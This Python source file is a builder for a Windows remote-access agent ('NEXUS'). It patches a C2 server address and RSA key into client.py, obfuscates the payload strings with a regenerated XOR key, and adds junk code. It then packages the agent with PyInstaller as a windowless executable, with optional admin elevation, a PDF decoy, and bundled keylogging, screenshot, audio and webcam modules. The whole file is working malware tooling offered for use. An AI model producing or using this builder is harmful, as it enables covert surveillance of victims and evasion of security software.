#!/usr/bin/env python3
"""
NEXUS Agent Builder — Convert client.py into a working Windows executable.
Builds client.py DIRECTLY (no encrypted loader) so PyInstaller auto-detects
all imports and the connection always works. Includes immortality, obfuscation,
RSA key generation, and PDF decoy.
"""

import os, sys, platform, subprocess, shutil, json, re, base64, zlib
import random, string, time as _time
from pathlib import Path

CONFIG_FILE = "builder_config.json"

DEFAULTS = {
    "server_ip": "127.0.0.1",
    "server_port": "80",
    "output_name": "agent",
    "console": False,
    "uac_admin": False,
    "icon": "",
    "upx": True,
    "onefile": True,
    "pdf_path": "decoy.pdf",
    "pdf_enabled": True,
    "stealth": True,
}


def get_local_ips():
    ips = ["127.0.0.1"]
    try:
        for info in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET):
            ip = info[4][0]
            if ip not in ips:
                ips.append(ip)
    except:
        pass
    return ips


class Builder:
    def __init__(self):
        self.config = dict(DEFAULTS)
        self.load_config()

    def load_config(self):
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE) as f:
                    saved = json.load(f)
                    for k in self.config:
                        if k in saved and saved[k]:
                            self.config[k] = saved[k]
            except:
                pass

    def save_config(self):
        with open(CONFIG_FILE, "w") as f:
            json.dump(self.config, f, indent=2)

    # ── Generate RSA keys ─────────────────────────────────────

    def _generate_keys(self, name):
        try:
            from Crypto.PublicKey import RSA
        except ImportError:
            subprocess.run([sys.executable, "-m", "pip", "install", "pycryptodome"],
                           capture_output=True)
            from Crypto.PublicKey import RSA
        key_dir = os.path.join(os.getcwd(), "keys", name)
        os.makedirs(key_dir, exist_ok=True)
        key = RSA.generate(2048)
        priv = key.export_key().decode()
        pub = key.publickey().export_key().decode()
        with open(os.path.join(key_dir, "private.pem"), "w") as f:
            f.write(priv)
        with open(os.path.join(key_dir, "public.pem"), "w") as f:
            f.write(pub)
        print(f"  [+] RSA keys -> keys/{name}/")
        return pub

    # ── Patch client.py ───────────────────────────────────────

    def patch_client(self):
        src = Path("client.py").read_text(encoding="utf-8")
        c = self.config
        src = re.sub(
            r'SERVER_IP = os\.environ\.get\("SERVER_IP", "[^"]*"\)',
            f'SERVER_IP = os.environ.get("SERVER_IP", "{c["server_ip"]}")',
            src,
        )
        src = re.sub(
            r'SERVER_PORT = int\(os\.environ\.get\("SERVER_PORT", os\.environ\.get\("PORT", "[^"]*"\)\)\)',
            f'SERVER_PORT = int(os.environ.get("SERVER_PORT", os.environ.get("PORT", "{c["server_port"]}")))',
            src,
        )
        pubkey = self._generate_keys(c["output_name"])
        src = re.sub(
            r'_EMBEDDED_PUBKEY = .+',
            lambda m: f'_EMBEDDED_PUBKEY = {json.dumps(pubkey)}',
            src,
        )
        src = re.sub(
            r'_AGENT_NAME = .+',
            lambda m: f'_AGENT_NAME = {json.dumps(c["output_name"])}',
            src,
        )
        Path("client.py").write_text(src, encoding="utf-8")
        print(f"  [+] Patched -> {c['server_ip']}:{c['server_port']}")
        return True

    # ── Obfuscation ──────────────────────────────────────────

    def obfuscate(self):
        if not self.config.get("stealth"):
            return
        print("  [+] Applying obfuscation...")
        src = Path("client.py").read_text("utf-8")

        # 1. Regenerate obfuscation key & re-encrypt all payload strings
        old_key_match = re.search(
            r'_OBF_KEY\s*=\s*bytes\.fromhex\("([^"]+)"\)', src
        )
        dec_fn_match = re.search(
            r'^def\s+(_[a-zA-Z]\w*)\s*\(blob\)\s*:', src, re.MULTILINE
        )
        dec_fn = dec_fn_match.group(1) if dec_fn_match else "_sb"

        if old_key_match:
            old_key = bytes.fromhex(old_key_match.group(1))
            new_key = os.urandom(16)

            def reobfuscate(m):
                old_b64 = m.group(1)
                try:
                    b = base64.b64decode(old_b64)
                    plain = bytes(
                        b[i] ^ old_key[i % len(old_key)] ^ (i & 0xFF)
                        for i in range(len(b))
                    )
                    new_b = bytes(
                        plain[i] ^ new_key[i % len(new_key)] ^ (i & 0xFF)
                        for i in range(len(plain))
                    )
                    return f'{dec_fn}("{base64.b64encode(new_b).decode()}")'
                except Exception:
                    return m.group(0)

            src = re.sub(rf'{re.escape(dec_fn)}\("([^"]+)"\)', reobfuscate, src)
            src = re.sub(
                r'_OBF_KEY\s*=\s*bytes\.fromhex\("[^"]+"\)',
                f'_OBF_KEY = bytes.fromhex("{new_key.hex()}")',
                src,
            )
            print("  [+] Regenerated obfuscation key + re-encrypted strings")

        # 2. Rename the decode function to a random name
        new_dec = "_" + "".join(
            random.choices(string.ascii_lowercase, k=random.randrange(10, 16))
        )
        src = re.sub(rf'\b{re.escape(dec_fn)}\b', new_dec, src)
        print(f"  [+] Renamed decode function {dec_fn} -> {new_dec}")

        # 3. Add junk functions (dead code)
        for _ in range(random.randrange(3, 6)):
            jn = "_" + "".join(
                random.choices(string.ascii_lowercase, k=random.randrange(8, 12))
            )
            body = "; ".join(
                f"_{random.getrandbits(16)} = {random.randint(0, 255)}"
                for _ in range(random.randrange(2, 5))
            )
            src += f"\ndef {jn}():\n    {body}\n"

        src += f"\n_obf_{random.randint(1000,9999)} = {random.randint(1,255)}\n"
        Path("client.py").write_text(src, "utf-8")
        print("  [+] Obfuscation complete")

    # ── Find PyInstaller ─────────────────────────────────────

    def find_pyinst(self):
        candidates = [[sys.executable, "-m", "PyInstaller"]]
        for p in [r"C:\Python311\python.exe", r"C:\Python312\python.exe"]:
            if os.path.exists(p):
                candidates.insert(0, [p, "-m", "PyInstaller"])
        for cmd in candidates:
            try:
                r = subprocess.run(cmd + ["--version"], capture_output=True, timeout=10)
                if r.returncode == 0:
                    return cmd
            except:
                pass
        print("  [!] Installing PyInstaller...")
        subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"],
                       capture_output=True, timeout=120)
        return [sys.executable, "-m", "PyInstaller"]

    # ── Build ─────────────────────────────────────────────────

    def build(self):
        print("\n" + "=" * 60)
        print("          BUILDING AGENT EXECUTABLE")
        print("=" * 60)

        if not os.path.exists("client.py"):
            print("  [X] client.py not found!")
            return

        # Restore clean client.py from git
        try:
            subprocess.run(["git", "checkout", "client.py"],
                           capture_output=True, timeout=5)
        except:
            pass

        if not self.patch_client():
            return
        self.obfuscate()

        # Prepare PDF decoy
        datas = []
        pdf_name = ""
        if self.config.get("pdf_enabled") and self.config.get("pdf_path"):
            pdf = self.config["pdf_path"]
            if os.path.exists(pdf):
                datas.append((os.path.abspath(pdf), "."))
                pdf_name = os.path.basename(pdf)

        c = self.config
        out_name = c["output_name"]
        build_file = f"client_build_{out_name}.py"

        # Write build file (patched client.py renamed for PyInstaller)
        shutil.copy("client.py", build_file)

        # Find PyInstaller
        pyinst = self.find_pyinst()
        if not pyinst:
            print("  [X] PyInstaller not found!")
            return

        # Build PyInstaller command
        cmd = pyinst + [
            "--noconfirm", "--clean",
            "--log-level=WARN",
            f"--name={out_name}",
            build_file
        ]
        # Ensure all required hidden imports are included
        for _mod in ["mss", "PIL", "pynput.keyboard", "pynput.mouse",
                      "sounddevice", "numpy", "cv2", "Crypto"]:
            cmd.append(f"--hidden-import={_mod}")
        if not c["console"]:
            cmd.append("--noconsole")
        if c["onefile"]:
            cmd.append("--onefile")
        else:
            cmd.append("--onedir")
        if c["upx"]:
            cmd.append("--upx-dir=.")
        if c["uac_admin"]:
            cmd.append("--uac-admin")
        if c["icon"] and os.path.exists(c["icon"]):
            cmd.append(f"--icon={c['icon']}")
        if pdf_name:
            sep = ";" if platform.system() == "Windows" else ":"
            cmd.append(f"--add-data={os.path.abspath(c['pdf_path'])}{sep}.")

        # Clean previous builds
        for d in ["build", "dist"]:
            if os.path.exists(d):
                shutil.rmtree(d, ignore_errors=True)
        os.makedirs("dist", exist_ok=True)

        print("  [+] Running PyInstaller (2-3 minutes)...")
        try:
            result = subprocess.run(cmd, capture_output=True, timeout=1800, text=True)
        except Exception as e:
            print(f"  [X] Build error: {e}")
            return
        finally:
            try:
                os.remove(build_file)
            except:
                pass

        if result.returncode == 0:
            exe = os.path.join("dist", out_name + ".exe")
            if os.path.exists(exe):
                size = os.path.getsize(exe) / (1024 * 1024)
                print("\n" + "=" * 60)
                print("  BUILD SUCCESSFUL!")
                print("=" * 60)
                print(f"  EXE: {exe}")
                print(f"  SIZE: {size:.2f} MB")
                print("=" * 60)
        else:
            print("  [X] Build FAILED!")
            if result.stderr:
                print(result.stderr[-1000:])

    # ── Menu ──────────────────────────────────────────────────

    def menu(self):
        os.system("cls" if os.name == "nt" else "clear")
        c = self.config
        print("=" * 60)
        print("         NEXUS AGENT BUILDER")
        print("=" * 60)
        print("\n[ CONFIGURATION ]")
        print("-" * 40)
        print(f"  [1] Server IP         {c['server_ip']}")
        print(f"  [2] Server Port       {c['server_port']}")
        print(f"  [3] Output EXE Name   {c['output_name']}")
        print(f"  [4] Console Window    {'Yes' if c['console'] else 'No'}")
        print(f"  [5] UAC Admin         {'Yes' if c['uac_admin'] else 'No'}")
        print(f"  [6] Icon File         {os.path.basename(c['icon']) if c['icon'] else 'None'}")
        print(f"  [7] UPX Compress      {'Yes' if c['upx'] else 'No'}")
        print(f"  [8] Single File       {'Yes' if c['onefile'] else 'No'}")
        print(f"  [9] PDF Decoy         {'Yes' if c['pdf_enabled'] and c['pdf_path'] else 'No'}")
        print(f"  [0] Stealth/Obfuscate {'Yes' if c['stealth'] else 'No'}")
        print("\n[ ACTIONS ]")
        print("-" * 40)
        print("  [B] Build Agent")
        print("  [C] Show Full Config")
        print("  [R] Reset to Defaults")
        print("  [Q] Quit")
        print()
        return input("  Choice: ").strip().lower()

    def edit(self, prompt, current):
        v = input(f"  {prompt} [{current}]: ").strip()
        return v if v else current

    def run(self):
        self.save_config()
        while True:
            ch = self.menu()
            c = self.config

            if ch == "1":
                ips = get_local_ips()
                print("  Interfaces:")
                for i, ip in enumerate(ips):
                    print(f"    [{i}] {ip}")
                print(f"    [C] Custom")
                p = input("  Choose: ").strip()
                if p == "c":
                    c["server_ip"] = input("  IP: ").strip() or c["server_ip"]
                elif p.isdigit() and int(p) < len(ips):
                    c["server_ip"] = ips[int(p)]
                self.save_config()
            elif ch == "2":
                c["server_port"] = self.edit("Port", c["server_port"])
                self.save_config()
            elif ch == "3":
                c["output_name"] = self.edit("Output name", c["output_name"])
                self.save_config()
            elif ch == "4":
                c["console"] = not c["console"]
                self.save_config()
            elif ch == "5":
                c["uac_admin"] = not c["uac_admin"]
                self.save_config()
            elif ch == "6":
                v = input(f"  Icon path [{c['icon'] or 'none'}]: ").strip()
                if v:
                    if os.path.exists(v) and v.lower().endswith('.ico'):
                        c["icon"] = v
                    else:
                        print("  [!] File not found or not .ico")
                else:
                    c["icon"] = ""
                self.save_config()
            elif ch == "7":
                c["upx"] = not c["upx"]
                self.save_config()
            elif ch == "8":
                c["onefile"] = not c["onefile"]
                self.save_config()
            elif ch == "9":
                c["pdf_enabled"] = not c["pdf_enabled"]
                if c["pdf_enabled"]:
                    v = input(f"  PDF path [{c['pdf_path']}]: ").strip()
                    if v:
                        if os.path.exists(v) and v.lower().endswith('.pdf'):
                            c["pdf_path"] = v
                        else:
                            print("  [!] Not a valid PDF")
                            c["pdf_enabled"] = False
                self.save_config()
            elif ch == "0":
                c["stealth"] = not c["stealth"]
                self.save_config()
            elif ch == "b":
                self.save_config()
                self.build()
                input("\n  Press Enter...")
            elif ch == "c":
                print(json.dumps(c, indent=2))
                input("\n  Press Enter...")
            elif ch == "r":
                if input("  Reset to defaults? (y/N): ").lower() == "y":
                    self.config = dict(DEFAULTS)
                    self.save_config()
                    print("  [+] Reset")
                input("\n  Press Enter...")
            elif ch == "q":
                self.save_config()
                print("  Goodbye!")
                break
            else:
                print(f"  Unknown: {ch}")
                _time.sleep(0.5)


if __name__ == "__main__":
    Builder().run()
